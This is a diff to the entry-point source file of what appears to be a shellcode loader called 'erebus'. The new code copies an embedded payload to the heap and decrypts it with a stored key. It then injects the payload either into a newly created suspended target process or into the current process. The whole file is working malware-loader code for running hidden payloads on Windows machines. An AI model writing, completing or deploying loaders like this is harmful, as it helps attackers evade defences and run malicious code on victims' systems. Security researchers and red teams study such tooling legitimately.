@@ -1,54 +1,74 @@
-#include "../include/key.hpp"
+#include "../include/shellcode.hpp"
 #include "../include/loader.hpp"
-#include "../include/config.hpp"
+// #include "../include/config.hpp" # Already imported in loader.hpp
 
+// =========================================================================
+// ENTRY POINT
+// =========================================================================
 VOID entry(void)
 {
+	// 1. Configure Injection Method based on Config
 	erebus::config.injection_method = ExecuteShellcode;
+	erebus::config.decryption_method = DecryptShellcode;
 
-	HANDLE process_handle, thread_handle = INVALID_HANDLE_VALUE;
-	BYTE* shellcode = NULL;
-	SIZE_T shellcode_size = 0;
+	HANDLE process_handle = NULL;
+	HANDLE thread_handle = NULL;
 
-	erebus::StageResource(IDR_EREBUS_BIN1, L"EREBUS_BIN", &shellcode, &shellcode_size);
+	// Start with the raw shellcode from the header
+	SIZE_T shellcode_size = sizeof(shellcode);
+	if (shellcode_size == 0) return;
 
+	// ============================================================
+	// 0. PREPARE MEMORY
+	// ============================================================
+	// Copy to Heap for Safe Decryption (Avoids Read-Only Access Violations)
+	unsigned char* pPayload = (unsigned char*)malloc(shellcode_size);
+	if (!pPayload) return; // Allocation failed
+
+	// Copy raw shellcode to heap
+	memcpy(pPayload, shellcode, shellcode_size);
+
+	// ============================================================
+	// 1. DECRYPT (Main handles Key)
+	// ============================================================
+
+	if (sizeof(key) > 0 && key[0] != 0x00 && CONFIG_ENCRYPTION_TYPE != 0) {
+		erebus::config.decryption_method(pPayload, shellcode_size, key, sizeof(key));
+	}
+
+	// ============================================================
+	// 2. TARGET PROCESS SETUP
+	// ============================================================
 #if CONFIG_INJECTION_MODE == 1
-	// Remote injection: create suspended process
+	// Remote Injection
 	wchar_t cmdline[] = CONFIG_TARGET_PROCESS;
-	erebus::CreateProcessSuspended(cmdline, &process_handle, &thread_handle);
+	if (!erebus::CreateProcessSuspended(cmdline, &process_handle, &thread_handle)) {
+		free(pPayload);
+		return;
+	}
 #elif CONFIG_INJECTION_MODE == 2
-	// Self injection: use current process
+	// Local Injection
 	process_handle = NtCurrentProcess();
 	thread_handle = NtCurrentThread();
 #endif
 
 	// ============================================================
-	// DEOBFUSCATION ROUTINE: Decode -> Decrypt -> Decompress
+	// 3. INJECT (Loader handles Decompression + Writing)
 	// ============================================================
+	erebus::config.injection_method(pPayload, shellcode_size, process_handle, thread_handle);
 
-	// STEP 1: DECODE (String-based encoding detection and decoding)
-	LOG_INFO("STEP 1: Analyzing encoding format...");
-	// Note: If shellcode is stored as encoded string, decode it first
-	// This would be handled if the shellcode resource is base64/ascii85/etc encoded
-
-	// STEP 2: DECRYPT (XOR or other decryption)
-	LOG_INFO("STEP 2: Decrypting shellcode...");
-	LOG_SUCCESS("Applying XOR decryption...");
-	erebus::DecryptionXOR(shellcode, shellcode_size, key, sizeof(key));
-	LOG_SUCCESS("Decryption complete");
-
-	// STEP 3: DECOMPRESS (Binary compression detection and decompression)
-	LOG_INFO("STEP 3: Analyzing compression format...");
-	erebus::AutoDetectAndDecode(&shellcode, &shellcode_size);
-	LOG_SUCCESS("Final shellcode size: %zu bytes", shellcode_size);
-
-	erebus::config.injection_method(shellcode, shellcode_size, process_handle, thread_handle);
+	// Cleanup
+	memset(pPayload, 0, shellcode_size);
+	free(pPayload);
 
 	return;
 }
 
-#if _DEBUG
+// =========================================================================
+// STANDARD ENTRY POINTS
+// =========================================================================
 
+#if _DEBUG
 int main()
 {
 	entry();
